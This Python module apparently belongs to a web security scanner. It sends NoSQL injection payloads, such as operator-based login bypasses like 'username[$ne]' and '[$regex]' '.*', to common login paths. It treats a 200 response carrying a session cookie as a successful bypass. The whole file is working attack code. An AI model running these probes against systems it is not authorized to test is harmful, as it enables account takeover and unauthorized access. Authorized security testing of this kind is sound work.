"""nosql_injection — MongoDB/NoSQL injection probe via JSON bodies + query operators"""
from core.http import HttpClient
from core.payload_source import get_payloads
import json

QUERY_PAYLOADS = [
    ("username[$ne]", "x", "password[$ne]", "x"),
    ("username[$gt]", "", "password[$gt]", ""),
    ("username[$regex]", ".*", "password[$regex]", ".*"),
    ("user[$ne]", "x", "pass[$ne]", "x"),
    ("login[$exists]", "true", "password[$exists]", "true"),
]

JSON_PAYLOADS = get_payloads("nosql", limit=15)

LOGIN_PATHS = ["/login","/api/login","/api/auth","/auth","/signin","/user/login","/session"]

class NosqlInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        # baseline response
        base_r = http.get(base)
        base_len = len(base_r.content) if base_r else 0

        for path in LOGIN_PATHS:
            url = base + path
            probe = http.get(url)
            if not probe or probe.status_code == 404: continue

            # JSON payloads
            for p in JSON_PAYLOADS:
                r = http.post(url, json=p, headers={"Content-Type":"application/json"})
                if not r: continue
                # success heuristic: 200 + set-cookie or big diff from baseline
                has_cookie = "set-cookie" in str(r.headers).lower()
                diff = abs(len(r.content) - base_len)
                if r.status_code == 200 and (has_cookie or diff > 500):
                    findings.append({"path":path,"payload":json.dumps(p)[:80],"type":"json"})
                    print(f"  [!] NoSQL JSON: {path} -> {json.dumps(p)[:60]}")
                    logger.finding("nosql","high",f"{path} {json.dumps(p)[:60]}")

            # query operator payloads
            for u_field, u_val, p_field, p_val in QUERY_PAYLOADS:
                data = {u_field: u_val, p_field: p_val}
                r = http.post(url, data=data)
                if not r: continue
                if r.status_code == 200 and "set-cookie" in str(r.headers).lower():
                    findings.append({"path":path,"payload":str(data)[:80],"type":"qs"})
                    print(f"  [!] NoSQL QS: {path} -> {data}")
                    logger.finding("nosql_qs","high",f"{path} {data}")

        print(f"[nosql_injection] {len(findings)}")
        return {"findings": findings}
